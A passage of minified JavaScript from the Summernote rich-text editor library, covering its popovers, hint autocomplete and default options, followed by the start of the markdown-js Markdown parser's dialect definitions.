this.options.keyMap[S.isMac ? "mac" : "pc"]; return Object.keys(o).map(function (t) { var e = o[t], n = B('<div><div class="help-list-item"/></div>'); return n.append(B("<label><kbd>" + t + "</kdb></label>").css({ width: 180, "margin-right": 10 })).append(B("<span/>").html(i.context.memo("help." + e) || e)), n.html() }).join("") }, Ne.prototype.showHelpDialog = function () { var e = this; return B.Deferred(function (t) { e.ui.onDialogShown(e.$dialog, function () { e.context.triggerEvent("dialog.shown"), t.resolve() }), e.ui.showDialog(e.$dialog) }).promise() }, Ne.prototype.show = function () { var t = this; this.context.invoke("editor.saveRange"), this.showHelpDialog().then(function () { t.context.invoke("editor.restoreRange") }) }, Ne); function Ne(t) { this.context = t, this.ui = B.summernote.ui, this.$body = B(document.body), this.$editor = t.layoutInfo.editor, this.options = t.options, this.lang = this.options.langInfo } var Te = (He.prototype.shouldInitialize = function () { return this.options.airMode && !T.isEmpty(this.options.popover.air) }, He.prototype.initialize = function () { this.$popover = this.ui.popover({ className: "note-air-popover" }).render().appendTo(this.options.container); var t = this.$popover.find(".popover-content"); this.context.invoke("buttons.build", t, this.options.popover.air) }, He.prototype.destroy = function () { this.$popover.remove() }, He.prototype.update = function () { var t, e, n = this.context.invoke("editor.currentStyle"); n.range && !n.range.isCollapsed() ? (t = T.last(n.range.getClientRects())) && (e = D.rect2bnd(t), this.$popover.css({ display: "block", left: Math.max(e.left + e.width / 2, 0) - 20, top: e.top + e.height }), this.context.invoke("buttons.updateCurrentStyle", this.$popover)) : this.hide() }, He.prototype.hide = function () { this.$popover.hide() }, He); function He(t) { var n = this; this.context = t, this.ui = B.summernote.ui, this.options = t.options, this.events = { "summernote.keyup summernote.mouseup summernote.scroll": function () { n.update() }, "summernote.disable summernote.change summernote.dialog.shown": function () { n.hide() }, "summernote.focusout": function (t, e) { S.isFF || e.relatedTarget && wt.ancestor(e.relatedTarget, D.eq(n.$popover[0])) || n.hide() } } } var Ee = (Re.prototype.shouldInitialize = function () { return 0 < this.hints.length }, Re.prototype.initialize = function () { var e = this; this.lastWordRange = null, this.$popover = this.ui.popover({ className: "note-hint-popover", hideArrow: !0, direction: "" }).render().appendTo(this.options.container), this.$popover.hide(), this.$content = this.$popover.find(".popover-content,.note-popover-content"), this.$content.on("click", ".note-hint-item", function (t) { e.$content.find(".active").removeClass("active"), B(t.currentTarget).addClass("active"), e.replace() }) }, Re.prototype.destroy = function () { this.$popover.remove() }, Re.prototype.selectItem = function (t) { this.$content.find(".active").removeClass("active"), t.addClass("active"), this.$content[0].scrollTop = t[0].offsetTop - this.$content.innerHeight() / 2 }, Re.prototype.moveDown = function () { var t, e = this.$content.find(".note-hint-item.active"), n = e.next(); n.length ? this.selectItem(n) : ((t = e.parent().next()).length || (t = this.$content.find(".note-hint-group").first()), this.selectItem(t.find(".note-hint-item").first())) }, Re.prototype.moveUp = function () { var t, e = this.$content.find(".note-hint-item.active"), n = e.prev(); n.length ? this.selectItem(n) : ((t = e.parent().prev()).length || (t = this.$content.find(".note-hint-group").last()), this.selectItem(t.find(".note-hint-item").last())) }, Re.prototype.replace = function () { var t, e = this.$content.find(".note-hint-item.active"); e.length && (t = this.nodeFromItem(e), this.lastWordRange.insertNode(t), Wt.createFromNode(t).collapse().select(), this.lastWordRange = null, this.hide(), this.context.triggerEvent("change", this.$editable.html(), this.$editable[0]), this.context.invoke("editor.focus")) }, Re.prototype.nodeFromItem = function (t) { var e = this.hints[t.data("index")], n = t.data("item"), i = e.content ? e.content(n) : n; return "string" == typeof i && (i = wt.createText(i)), i }, Re.prototype.createItemTemplates = function (i, t) { var o = this.hints[i]; return t.map(function (t, e) { var n = B('<div class="note-hint-item"/>'); return n.append(o.template ? o.template(t) : t + ""), n.data({ index: i, item: t }), n }) }, Re.prototype.handleKeydown = function (t) { this.$popover.is(":visible") && (t.keyCode === Tt.code.ENTER ? (t.preventDefault(), this.replace()) : t.keyCode === Tt.code.UP ? (t.preventDefault(), this.moveUp()) : t.keyCode === Tt.code.DOWN && (t.preventDefault(), this.moveDown())) }, Re.prototype.searchKeyword = function (t, e, n) { var i, o = this.hints[t]; o && o.match.test(e) && o.search ? (i = o.match.exec(e), o.search(i[1], n)) : n() }, Re.prototype.createGroup = function (e, t) { var n = this, i = B('<div class="note-hint-group note-hint-group-' + e + '"/>'); return this.searchKeyword(e, t, function (t) { (t = t || []).length && (i.html(n.createItemTemplates(e, t)), n.show()) }), i }, Re.prototype.handleKeyup = function (t) { var e, n, i, o = this; T.contains([Tt.code.ENTER, Tt.code.UP, Tt.code.DOWN], t.keyCode) || (e = this.context.invoke("editor.getLastRange").getWordRange(), n = e.toString(), this.hints.length && n ? (this.$content.empty(), (i = D.rect2bnd(T.last(e.getClientRects()))) && (this.$popover.hide(), this.lastWordRange = e, this.hints.forEach(function (t, e) { t.match.test(n) && o.createGroup(e, n).appendTo(o.$content) }), this.$content.find(".note-hint-item:first").addClass("active"), "top" === this.direction ? this.$popover.css({ left: i.left, top: i.top - this.$popover.outerHeight() - 5 }) : this.$popover.css({ left: i.left, top: i.top + i.height + 5 }))) : this.hide()) }, Re.prototype.show = function () { this.$popover.show() }, Re.prototype.hide = function () { this.$popover.hide() }, Re); function Re(t) { var n = this; this.context = t, this.ui = B.summernote.ui, this.$editable = t.layoutInfo.editable, this.options = t.options, this.hint = this.options.hint || [], this.direction = this.options.hintDirection || "bottom", this.hints = Array.isArray(this.hint) ? this.hint : [this.hint], this.events = { "summernote.keyup": function (t, e) { e.isDefaultPrevented() || n.handleKeyup(e) }, "summernote.keydown": function (t, e) { n.handleKeydown(e) }, "summernote.disable summernote.dialog.shown": function () { n.hide() } } } B.summernote = B.extend(B.summernote, { version: "0.8.12", plugins: {}, dom: wt, range: Wt, options: { langInfo: B.summernote.lang["en-US"], modules: { editor: Kt, clipboard: jt, dropzone: te, codeview: ne, statusbar: oe, fullscreen: se, handle: ge, hintPopover: Ee, autoLink: Ie, autoSync: he, autoReplace: Ce, placeholder: pe, buttons: fe, toolbar: Be, linkDialog: ve, linkPopover: Fe, imageDialog: Ge, imagePopover: Xe, tablePopover: ke, videoDialog: Ze, helpDialog: We, airPopover: Te }, buttons: {}, lang: "en-US", followingToolbar: !1, otherStaticBar: "", toolbar: [["style", ["style"]], ["font", ["bold", "underline", "clear"]], ["fontname", ["fontname"]], ["color", ["color"]], ["para", ["ul", "ol", "paragraph"]], ["table", ["table"]], ["insert", ["link", "picture", "video"]], ["view", ["fullscreen", "codeview", "help"]]], popatmouse: !0, popover: { image: [["resize", ["resizeFull", "resizeHalf", "resizeQuarter", "resizeNone"]], ["float", ["floatLeft", "floatRight", "floatNone"]], ["remove", ["removeMedia"]]], link: [["link", ["linkDialogShow", "unlink"]]], table: [["add", ["addRowDown", "addRowUp", "addColLeft", "addColRight"]], ["delete", ["deleteRow", "deleteCol", "deleteTable"]]], air: [["color", ["color"]], ["font", ["bold", "underline", "clear"]], ["para", ["ul", "paragraph"]], ["table", ["table"]], ["insert", ["link", "picture"]]] }, airMode: !1, width: null, height: null, linkTargetBlank: !0, focus: !1, tabSize: 4, styleWithSpan: !0, shortcuts: !0, textareaAutoSync: !0, hintDirection: "bottom", tooltip: "auto", container: "body", maxTextLength: 0, blockquoteBreakingLevel: 2, spellCheck: !0, styleTags: ["p", "blockquote", "pre", "h1", "h2", "h3", "h4", "h5", "h6"], fontNames: ["Arial", "Arial Black", "Comic Sans MS", "Courier New", "Helvetica Neue", "Helvetica", "Impact", "Lucida Grande", "Tahoma", "Times New Roman", "Verdana"], fontNamesIgnoreCheck: [], fontSizes: ["8", "9", "10", "11", "12", "14", "18", "24", "36"], colors: [["#000000", "#424242", "#636363", "#9C9C94", "#CEC6CE", "#EFEFEF", "#F7F7F7", "#FFFFFF"], ["#FF0000", "#FF9C00", "#FFFF00", "#00FF00", "#00FFFF", "#0000FF", "#9C00FF", "#FF00FF"], ["#F7C6CE", "#FFE7CE", "#FFEFC6", "#D6EFD6", "#CEDEE7", "#CEE7F7", "#D6D6E7", "#E7D6DE"], ["#E79C9C", "#FFC69C", "#FFE79C", "#B5D6A5", "#A5C6CE", "#9CC6EF", "#B5A5D6", "#D6A5BD"], ["#E76363", "#F7AD6B", "#FFD663", "#94BD7B", "#73A5AD", "#6BADDE", "#8C7BC6", "#C67BA5"], ["#CE0000", "#E79439", "#EFC631", "#6BA54A", "#4A7B8C", "#3984C6", "#634AA5", "#A54A7B"], ["#9C0000", "#B56308", "#BD9400", "#397B21", "#104A5A", "#085294", "#311873", "#731842"], ["#630000", "#7B3900", "#846300", "#295218", "#083139", "#003163", "#21104A", "#4A1031"]], colorsName: [["Black", "Tundora", "Dove Gray", "Star Dust", "Pale Slate", "Gallery", "Alabaster", "White"], ["Red", "Orange Peel", "Yellow", "Green", "Cyan", "Blue", "Electric Violet", "Magenta"], ["Azalea", "Karry", "Egg White", "Zanah", "Botticelli", "Tropical Blue", "Mischka", "Twilight"], ["Tonys Pink", "Peach Orange", "Cream Brulee", "Sprout", "Casper", "Perano", "Cold Purple", "Careys Pink"], ["Mandy", "Rajah", "Dandelion", "Olivine", "Gulf Stream", "Viking", "Blue Marguerite", "Puce"], ["Guardsman Red", "Fire Bush", "Golden Dream", "Chelsea Cucumber", "Smalt Blue", "Boston Blue", "Butterfly Bush", "Cadillac"], ["Sangria", "Mai Tai", "Buddha Gold", "Forest Green", "Eden", "Venice Blue", "Meteorite", "Claret"], ["Rosewood", "Cinnamon", "Olive", "Parsley", "Tiber", "Midnight Blue", "Valentino", "Loulou"]], colorButton: { foreColor: "#000000", backColor: "#FFFF00" }, lineHeights: ["1.0", "1.2", "1.4", "1.5", "1.6", "1.8", "2.0", "3.0"], tableClassName: "table table-bordered", insertTableMaxSize: { col: 10, row: 10 }, dialogsInBody: !1, dialogsFade: !1, maximumImageFileSize: null, callbacks: { onBeforeCommand: null, onBlur: null, onBlurCodeview: null, onChange: null, onChangeCodeview: null, onDialogShown: null, onEnter: null, onFocus: null, onImageLinkInsert: null, onImageUpload: null, onImageUploadError: null, onInit: null, onKeydown: null, onKeyup: null, onMousedown: null, onMouseup: null, onPaste: null, onScroll: null }, codemirror: { mode: "text/html", htmlMode: !0, lineNumbers: !0 }, codeviewFilter: !1, codeviewFilterRegex: /<\/*(?:applet|b(?:ase|gsound|link)|embed|frame(?:set)?|ilayer|l(?:ayer|ink)|meta|object|s(?:cript|tyle)|t(?:itle|extarea)|xml)[^>]*?>/gi, codeviewIframeFilter: !0, codeviewIframeWhitelistSrc: [], codeviewIframeWhitelistSrcBase: ["www.youtube.com", "www.youtube-nocookie.com", "www.facebook.com", "vine.co", "instagram.com", "player.vimeo.com", "www.dailymotion.com", "player.youku.com", "v.qq.com"], keyMap: { pc: { ENTER: "insertParagraph", "CTRL+Z": "undo", "CTRL+Y": "redo", TAB: "tab", "SHIFT+TAB": "untab", "CTRL+B": "bold", "CTRL+I": "italic", "CTRL+U": "underline", "CTRL+SHIFT+S": "strikethrough", "CTRL+BACKSLASH": "removeFormat", "CTRL+SHIFT+L": "justifyLeft", "CTRL+SHIFT+E": "justifyCenter", "CTRL+SHIFT+R": "justifyRight", "CTRL+SHIFT+J": "justifyFull", "CTRL+SHIFT+NUM7": "insertUnorderedList", "CTRL+SHIFT+NUM8": "insertOrderedList", "CTRL+LEFTBRACKET": "outdent", "CTRL+RIGHTBRACKET": "indent", "CTRL+NUM0": "formatPara", "CTRL+NUM1": "formatH1", "CTRL+NUM2": "formatH2", "CTRL+NUM3": "formatH3", "CTRL+NUM4": "formatH4", "CTRL+NUM5": "formatH5", "CTRL+NUM6": "formatH6", "CTRL+ENTER": "insertHorizontalRule", "CTRL+K": "linkDialog.show" }, mac: { ENTER: "insertParagraph", "CMD+Z": "undo", "CMD+SHIFT+Z": "redo", TAB: "tab", "SHIFT+TAB": "untab", "CMD+B": "bold", "CMD+I": "italic", "CMD+U": "underline", "CMD+SHIFT+S": "strikethrough", "CMD+BACKSLASH": "removeFormat", "CMD+SHIFT+L": "justifyLeft", "CMD+SHIFT+E": "justifyCenter", "CMD+SHIFT+R": "justifyRight", "CMD+SHIFT+J": "justifyFull", "CMD+SHIFT+NUM7": "insertUnorderedList", "CMD+SHIFT+NUM8": "insertOrderedList", "CMD+LEFTBRACKET": "outdent", "CMD+RIGHTBRACKET": "indent", "CMD+NUM0": "formatPara", "CMD+NUM1": "formatH1", "CMD+NUM2": "formatH2", "CMD+NUM3": "formatH3", "CMD+NUM4": "formatH4", "CMD+NUM5": "formatH5", "CMD+NUM6": "formatH6", "CMD+ENTER": "insertHorizontalRule", "CMD+K": "linkDialog.show" } }, icons: { align: "note-icon-align", alignCenter: "note-icon-align-center", alignJustify: "note-icon-align-justify", alignLeft: "note-icon-align-left", alignRight: "note-icon-align-right", rowBelow: "note-icon-row-below", colBefore: "note-icon-col-before", colAfter: "note-icon-col-after", rowAbove: "note-icon-row-above", rowRemove: "note-icon-row-remove", colRemove: "note-icon-col-remove", indent: "note-icon-align-indent", outdent: "note-icon-align-outdent", arrowsAlt: "note-icon-arrows-alt", bold: "note-icon-bold", caret: "note-icon-caret", circle: "note-icon-circle", close: "note-icon-close", code: "note-icon-code", eraser: "note-icon-eraser", floatLeft: "note-icon-float-left", floatRight: "note-icon-float-right", font: "note-icon-font", frame: "note-icon-frame", italic: "note-icon-italic", link: "note-icon-link", unlink: "note-icon-chain-broken", magic: "note-icon-magic", menuCheck: "note-icon-menu-check", minus: "note-icon-minus", orderedlist: "note-icon-orderedlist", pencil: "note-icon-pencil", picture: "note-icon-picture", question: "note-icon-question", redo: "note-icon-redo", rollback: "note-icon-rollback", square: "note-icon-square", strikethrough: "note-icon-strikethrough", subscript: "note-icon-subscript", superscript: "note-icon-superscript", table: "note-icon-table", textHeight: "note-icon-text-height", trash: "note-icon-trash", underline: "note-icon-underline", undo: "note-icon-undo", unorderedlist: "note-icon-unorderedlist", video: "note-icon-video" } } }), B.summernote = B.extend(B.summernote, { ui: f }) }), function (o) { var I = o.Markdown = function (t) { switch (typeof t) { case "undefined": this.dialect = I.dialects.Gruber; break; case "object": this.dialect = t; break; default: if (!(t in I.dialects)) throw new Error("Unknown Markdown dialect '" + String(t) + "'"); this.dialect = I.dialects[t] }this.em_state = [], this.strong_state = [], this.debug_indent = "" }; function s() { return "Markdown.mk_block( " + uneval(this.toString()) + ", " + uneval(this.trailing) + ", " + uneval(this.lineNumber) + " )" } function r() { var t = require("util"); return "Markdown.mk_block( " + t.inspect(this.toString()) + ", " + t.inspect(this.trailing) + ", " + t.inspect(this.lineNumber) + " )" } o.parse = function (t, e) { return new I(e).toTree(t) }, o.toHTML = function (t, e, n) { var i = o.toHTMLTree(t, e, n); return o.renderJsonML(i) }, o.toHTMLTree = function (t, e, n) { "string" == typeof t && (t = this.parse(t, e)); var i = h(t), o = {}; i && i.references && (o = i.references); var a = function t(e, n, i) { var o; i = i || {}; var a = e.slice(0); "function" == typeof i.preprocessTreeNode && (a = i.preprocessTreeNode(a, n)); var s = h(a); if (s) { for (o in a[1] = {}, s) a[1][o] = s[o]; s = a[1] } if ("string" == typeof a) return a; switch (a[0]) { case "header": a[0] = "h" + a[1].level, delete a[1].level; break; case "bulletlist": a[0] = "ul"; break; case "numberlist": a[0] = "ol"; break; case "listitem": a[0] = "li"; break; case "para": a[0] = "p"; break; case "markdown": a[0] = "html", s && delete s.references; break; case "code_block": a[0] = "pre", o = s ? 2 : 1; var r = ["code"]; r.push.apply(r, a.splice(o, a.length - o)), a[o] = r; break; case "inlinecode": a[0] = "code"; break; case "img": a[1].src = a[1].href, delete a[1].href; break; case "linebreak": a[0] = "br"; break; case "link": a[0] = "a"; break; case "link_ref": a[0] = "a"; var g = n[s.ref]; if (!g) return s.original; delete s.ref, s.href = g.href, g.title && (s.title = g.title), delete s.original; break; case "img_ref": a[0] = "img"; var g = n[s.ref]; if (!g) return s.original; delete s.ref, s.src = g.href, g.title && (s.title = g.title), delete s.original }o = 1; if (s) { for (var l in a[1]) { o = 2; break } 1 === o && a.splice(o, 1) } for (; o < a.length; ++o)a[o] = t(a[o], n, i); return a }(t, o, n); return function t(e) { var n = h(e) ? 2 : 1; for (; n < e.length;)"string" == typeof e[n] ? n + 1 < e.length && "string" == typeof e[n + 1] ? e[n] += e.splice(n + 1, 1)[0] : ++n : (t(e[n]), ++n) }(a), a }; var y, v, x, F, Q = I.mk_block = function (t, e, n) { 1 == arguments.length && (e = "\n\n"); var i = new String(t); return i.trailing = e, i.inspect = r, i.toSource = s, null != n && (i.lineNumber = n), i }; function g(t) { for (var e = 0, n = -1; -1 !== (n = t.indexOf("\n", n + 1));)e++; return e } function G(t, e, n, i) { if (e) t.push(["para"].concat(n)); else { var o = t[t.length - 1] instanceof Array && "para" == t[t.length - 1][0] ? t[t.length - 1] : t; i && 1 < t.length && n.unshift(i); for (var a = 0; a < n.length; a++) { var s = n[a]; "string" == typeof s && 1 < o.length && "string" == typeof o[o.length - 1] ? o[o.length - 1] += s : o.push(s) } } } function w(t, e, n) { var i, o = t.list, a = o[o.length - 1]; a[1] instanceof Array && "para" == a[1][0] || (e + 1 == n.length ? a.push(["para"].concat(a.splice(1, a.length - 1))) : (i = a.pop(), a.push(["para"].concat(a.splice(1, a.length - 1)), i))) } function t(s, r) { var g = s + "_state", l = "strong" == s ? "em_state" : "strong_state"; function c(t) { this.len_after = t, this.name = "close_" + r } return function (t, e) { if (this[g][0] == r) return this[g].shift(), [t.length, new c(t.length - r.length)]; var n = this[l].slice(), i = this[g].slice(); this[g].unshift(r); var o = this.processInline(t.substr(r.length)), a = o[o.length - 1]; this[g].shift(); return a instanceof c ? (o.pop(), [t.length - a.len_after, [s].concat(o)]) : (this[l] = n, this[g] = i, [r.length, r]) } } I.prototype.split_blocks = function (t) { t = t.replace(/(\r\n|\n|\r)/g, "\n"); var e, n = /([\s\S]+?)($|\n#|\n(?:\s*\n|$)+)/g, i = [], o = 1; for (null != (e = /^(\s*\n)/.exec(t)) && (o += g(e[0]), n.lastIndex = e[0].length); null !== (e = n.exec(t));)"\n#" == e[2] && (e[2] = "\n", n.lastIndex--), i.push(Q(e[1], e[2], o)), o += g(e[0]); return i }, I.prototype.processBlock = function (t, e) { var n = this.dialect.block, i = n.__order__; if ("__call__" in n) return n.__call__.call(this, t, e); for (var o = 0; o < i.length; o++) { var a = n[i[o]].call(this, t, e); if (a) return (!l(a) || 0 < a.length && !l(a[0])) && this.debug(i[o], "didn't return a proper array"), a } return [] }, I.prototype.processInline = function (t) { return this.dialect.inline.__call__.call(this, String(t)) }, I.prototype.toTree = function (t, e) { var n = t instanceof Array ? t : this.split_blocks(t), i = this.tree; try { for (this.tree = e || this.tree || ["markdown"]; n.length;) { var o = this.processBlock(n.shift(), n); o.length && this.tree.push.apply(this.tree, o) } return this.tree } finally { e && (this.tree = i) } }, I.prototype.debug = function () { var t = Array.prototype.slice.call(arguments); t.unshift(this.debug_indent), "undefined" != typeof print && print.apply(print, t), "undefined" != typeof console && void 0 !== console.log && console.log.apply(null, t) }, I.prototype.loop_re_over_block = function (t, e, n) { for (var i, o = e.valueOf(); o.length && null != (i = t.exec(o));)o = o.substr(i[0].length), n.call(this, i); return o }, I.dialects = {}, I.dialects.Gruber = { block: { atxHeader: function (t, e) { var n = t.match(/^(#{1,6})\s*(.*?)\s*#*\s*(?:\n|$)/); if (n) { var i = ["header", { level: n[1].length }]; return Array.prototype.push.apply(i, this.processInline(n[2])), n[0].length < t.length && e.unshift(Q(t.substr(n[0].length), t.trailing, t.lineNumber + 2)), [i] } }, setextHeader: function (t, e) { var n = t.match(/^(.*)\n([-=])\2\2+(?:\n|$)/); if (n) { var i = ["header", { level: "=" === n[2] ? 1 : 2 }, n[1]]; return n[0].length < t.length && e.unshift(Q(t.substr(n[0].length), t.trailing, t.lineNumber + 2)), [i] } }, code: function (t, e) { var n = [], i = /^(?: {0,3}\t| {4})(.*)\n?/; if (t.match(i)) { t: for (; ;) { var o = this.loop_re_over_block(i, t.valueOf(), function (t) { n.push(t[1]) }); if (o.length) { e.unshift(Q(o, t.trailing)); break t } if (!e.length) break t; if (!e[0].match(i)) break t; n.push(t.trailing.replace(/[^\n]/g, "").substring(2)), t = e.shift() } return [["code_block", n.join("\n")]] } }, horizRule: function (t, e) { var n = t.match(/^(?:([\s\S]*?)\n)?[ \t]*([-_*])(?:[ \t]*\2){2,}[ \t]*(?:\n([\s\S]*))?$/); if (n) { var i = [["hr"]]; return n[1] && i.unshift.apply(i, this.processBlock(n[1], [])), n[3] && e.unshift(Q(n[3])), i } }, lists: (y = "[*+-]|\\d+\\.", v = /[*+-]/, x = new RegExp("^( {0,3})(" + y + ")[ \t]+"), F = "(?: {0,3}\\t| {4})", function (t, e) { if (I = t.match(x)) { for (var n, i, o = [], a = B(I), s = !1, r = [o[0].list]; ;) { for (var g = t.split(/(?=\n)/), l = "", c = 0; c < g.length; c++) { var I, u = "", h = g[c].replace(/^\n/, function (t) { return u = t, "" }), d = (i = o.length, new RegExp("(?:^(" + F + "{0," + i + "} {0,3})(" + y + ")\\s+)|(^" + F + "{0," + (i - 1) + "}[ ]{0,4})")); if (void 0 !== (I = h.match(d))[1]) { l.length && (G(n, s, this.processInline(l), u), s = !1, l = ""), I[1] = I[1].replace(/ {0,3}\t/g, "    "); var C = Math.floor(I[1].length / 4) + 1; if (C > o.length) a = B(I), n.push(a), n = a[1] = ["listitem"]; else { for (var A = !1, p = 0; p < o.length; p++)if (o[p].indent == I[1]) { a = o[p].list, o.splice(p + 1, o.length - (p + 1)), A = !0; break } A || (++C <= o.length ? (o.splice(C, o.length - C), a = o[C - 1].list) : (a = B(I), n.push(a))), n = ["listitem"], a.push(n) } u = "" } h.length > I[0].length && (l += u + h.substr(I[0].length)) } l.length && (G(n, s, this.processInline(l), u), s = !1, l = ""); var m = function (t, e) { for (var n = new RegExp("^(" + F + "{" + t + "}.*?\\n?)*$"), i = new RegExp("^" + F + "{" + t + "}", "gm"), o = []; 0 < e.length && n.exec(e[0]);) { var a = e.shift(), s = a.replace(i, ""); o.push(Q(s, a.trailing, a.lineNumber)) } return o }(o.length, e); 0 < m.length && (X(o, w, this), n.push.apply(n, this.toTree(m, []))); var f = e[0] && e[0].valueOf() || ""; if (!f.match(x) && !f.match(/^ /)) break; t = e.shift(); var b = this.dialect.block.horizRule(t, e); if (b) { r.push.apply(r, b); break } X(o, w, this), s = !0 } return r } function B(t) { var e = v.exec(t[2]) ? ["bulletlist"] : ["numberlist"]; return o.push({ list: e, indent: t[1] }), e } }), blockquote: function (t, e) { if (t.match(/^>/m)) { var n = []; if (">" != t[0]) { for (var i = t.split(/\n/), o = [], a = t.lineNumber; i.length && ">" != i[0][0];)o.push(i.shift()), a++; var s = Q(o.join("\n"), "\n", t.lineNumber); n.push.apply(n, this.processBlock(s, [])), t = Q(i.join("\n"), t.trailing, a) } for (; e.length && ">" == e[0][0];) { var r = e.shift(); t = Q(t + t.trailing + r, r.trailing, t.lineNumber) } var g = t.replace(/^> ?/gm, ""), l = (this.tree, this.toTree(g, ["blockquote"])), c = h(l); return c && c.references && (delete c.references, u(c) && l.splice(1, 1)), n.push(l), n } }, referenceDefn: function (t, e) { var n = /^\s*\[(.*?)\]:\s*(\S+)(?:\s+(?:(['"])(.*?)\3|\((.*?)\)))?\n?/; if (t.match(n)) { h(this.tree) || this.tree.splice(1, 0, {}); var i = h(this.tree); void 0 === i.references && (i.references = {}); var o = this.loop_re_over_block(n, t, function (t) { t[2] && "<" == t[2][0] && ">" == t[2][t[2].length - 1] && (t[2] = t[2].substring(1, t[2].length - 1)); var e = i.references[t[1].toLowerCase()] = { href: t[2] }; void 0 !== t[4] ? e.title = t[4] : void 0 !== t[5] && (e.title = t[5]) }); return o.length && e.unshift(Q(o, t.trailing)), [] } }, para: function (t) { return [["para"].concat(this.processInline(t))] } } }, I.dialects.Gruber.inline = { __oneElement__: function (t, e, n) { var i, o; return e = e || this.dialect.inline.__patterns__, (i = new RegExp("([\\s\\S]*?)(" + (e.source || e) + ")").exec(t)) ? i[1] ? [i[1].length, i[1]] : (i[2] in this.dialect.inline && (o = this.dialect.inline[i[2]].call(this, t.substr(i.index), i, n || [])), o = o || [i[2].length, i[2]]) : [t.length, t] }, __call__: function (t, e) { var n, i = []; function o(t) { "string" == typeof t && "string" == typeof i[i.length - 1] ? i[i.length - 1] += t : i.push(t) } for (; 0 < t.length;)n = this.dialect.inline.__oneElement__.call(this, t, e, i), t = t.substr(n.shift()), X(n, o); return i }, "]": function () { }, "}": function () { }, __escape__: /^\\[\\`\*_{}\[\]()#\+.!\-]/, "\\": function (t) { return this.dialect.inline.__escape__.exec(t) ? [2, t.charAt(1)] : [1, "\\"] }, "![": function (t) { var e = t.match(/^!\[(.*?)\][ \t]*\([ \t]*([^")]*?)(?:[ \t]+(["'])(.*?)\3)?[ \t]*\)/); if (e) { e[2] && "<" == e[2][0] && ">" == e[2][e[2].length - 1] && (e[2] = e[2].substring(1, e[2].length - 1)), e[2] = this.dialect.inline.__call__.call(this, e[2], /\\/)[0]; var n = { alt: e[1], href: e[2] || "" }; return void 0 !== e[4] && (n.title = e[4]), [e[0].length, ["img", n]] } return (e = t.match(/^!\[(.*?)\][ \t]*\[(.*?)\]/)) ? [e[0].length, ["img_ref", { alt: e[1], ref: e[2].toLowerCase(), original: e[0] }]] : [2, "!["] }, "[": function (t) { var e = String(t), n = I.DialectHelpers.inline_until_char.call(this, t.substr(1), "]"); if (!n) return [1, "["]; var i, o, a = 1 + n[0], s = n[1], r = (t = t.substr(a)).match(/^\s*\([ \t]*([^"']*)(?:[ \t]+(["'])(.*?)\2)?[ \t]*\)/); if (r) { var g = r[1]; if (a += r[0].length, g && "<" == g[0] && ">" == g[g.length - 1] && (g = g.substring(1, g.length - 1)), !r[3]) for (var l = 1, c = 0; c < g.length; c++)switch (g[c]) { case "(": l++; break; case ")": 0 == --l && (a -= g.length - c, g = g.substring(0, c)) }return o = { href: (g = this.dialect.inline.__call__.call(this, g, /\\/)[0]) || "" }, void 0 !== r[3] && (o.title = r[3]), i = ["link", o].concat(s), [a, i] } return (r = t.match(/^\s*\[(.*?)\]/)) ? (a += r[0].length, i = ["link_ref", o = { ref: (r[1] || String(s)).toLowerCase(), original: e.substr(0, a) }].concat(s), [a, i]) : 1 == s.length && "string" == typeof s[0] ? (i = ["link_ref", o = { ref: s[0].toLowerCase(), original: e.substr(0, a) }, s[0]], [a, i]) : [1, "["] }, "<": function (t) { var e; return null != (e = t.match(/^<(?:((https?|ftp|mailto):[^>]+)|(.*?@.*?\.[a-zA-Z]+))>/)) ? e[3] ? [e[0].length, ["link", { href: "mailto:" + e[3] }, e[3]]] : "mailto" == e[2] ? [e[0].length, ["link", { href: e[1] }, e[1].substr("mailto:".length)]] : [e[0].length, ["link", { href: e[1] }, e[1]]] : [1, "<"] }, "`": function (t) { var e = t.match(/(`+)(([\s\S]*?)\1)/); return e && e[2] ? [e[1].length + e[2].length, ["inlinecode", e[3]]] : [1, "`"] }, "  \n": function () { return [3, ["linebreak"]] } }, I.dialects.Gruber.inline["**"] = t("strong", "**"), I.dialects.Gruber.inline.__ = t("strong", "__"), I.dialects.Gruber.inline["*"] = t("em", "*"), I.dialects.Gruber.inline._ = t("em", "_"), I.buildBlockOrder = function (t) { var e = []; for (var n in t) "__order__" != n && "__call__" != n && e.push(n); t.__order__ = e }, I.buildInlinePatterns = function (t) { var e, n = []; for (var i in t) { i.match(/^__.*__$/) || (e = i.replace(/([\\.*+?|()\[\]{}])/g, "\\$1").replace(/\n/, "\\n"), n.push(1 == i.length ? e : "(?:" + e + ")")) } n = n.join("|"), t.__patterns__ = n; var o = t.__call__; t.__call__ = function (t, e) { return null != e ? o.call(this, t, e) : o.call(this, t, n) } }, I.DialectHelpers = {}, I.DialectHelpers.inline_until_char = function (t, e) { for (var n = 0, i = []; ;) { if (t.charAt(n) == e) return [++n, i]; if (n >= t.length) return null; var o = this.dialect.inline.__oneElement__.call(this, t.substr(n)); n += o[0], i.push.apply(i, o.slice(1)) } }, I.subclassDialect = function (t) { function e() { } function n() { } return e.prototype = t.block, n.prototype = t.inline, { block: new e, inline: new n } }, I.buildBlockOrder(I.dialects.Gruber.block), I.buildInlinePatterns(I.dialects.Gruber.inline), I.dialects.Maruku = I.subclassDialect(I.dialects.Gruber), I.dialects.Maruku.processMetaHash = function (t) { for (var e, n = function (t) { var e = t.split(""), n = [""], i = !1; for (; e.length;) { var o = e.shift(); switch (o) { case " ": i ? n[n.length - 1] += o : n.push(""); break; case "'": case '"': i = !i; break; case "\\": o = e.shift(); default: n[n.length - 1] += o } } return n }(t), i = {}, o = 0; o < n.length; ++o) { /^#/.test(n[o]) ? i.id = n[o].substring(1) : /^\./.test(n[o]) ? i.class ? i.class = i.class + n[o].replace(/./, " ") : i.class = n[o].substring(1) : /\=/.test(n[o]) && (i[(e = n[o].split(/\=/))[0]] = e[1]) } return i }, I.dialects.Maruku.block.document_meta = function (t) { if (!(1 < t.lineNumber) && t.match(/^(?:\w+:.*\n)*\w+:.*$/)) { h(this.tree) || this.tree.splice(1, 0, {}); var e = t.split(/\n/); for (p in e) { var n = e[p].match(/(\w+):\s*(.*)$/), i = n[1].toLowerCase(), o = n[2]; this.tree[1][i] = o } return [] } }, I.dialects.Maruku.block.block_meta = function (t) { var e = t.match(/(^|\n) {0,3}\{:\s*((?:\\\}|[^\}])*)\s*\}$/); if (e) { var n = this.dialect.processMetaHash(e[2]); if ("" === e[1]) { var i = this.tree[this.tree.length - 1], o = h(i); if ("string" == typeof i) return; for (a in o || (o = {}, i.splice(1, 0, o)), n) o[a] = n[a]; return [] } var s = t.replace(/\n.*$/, ""), r = this.processBlock(s, []); for (a in (o = h(r[0])) || (o = {}, 